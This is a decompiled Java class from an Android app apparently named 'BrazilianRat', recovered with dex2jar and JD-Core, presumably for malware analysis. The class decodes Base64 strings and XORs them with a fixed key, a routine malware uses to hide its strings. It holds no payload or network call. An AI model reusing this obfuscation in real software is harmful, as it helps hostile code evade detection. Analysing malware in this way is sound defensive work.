package com.irifix;

import android.util.Base64;
import java.nio.charset.StandardCharsets;

public class m {
  private static int a = 8;
  
  public static String a(String paramString) {
    if (paramString == null || paramString.isEmpty())
      return ""; 
    byte b = 0;
    paramString = new String(Base64.decode(paramString, 0), StandardCharsets.UTF_8);
    StringBuilder stringBuilder = new StringBuilder();
    while (b < paramString.length()) {
      stringBuilder.append(Character.toString((char)(paramString.charAt(b) ^ a)));
      b++;
    } 
    return stringBuilder.toString();
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/m.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */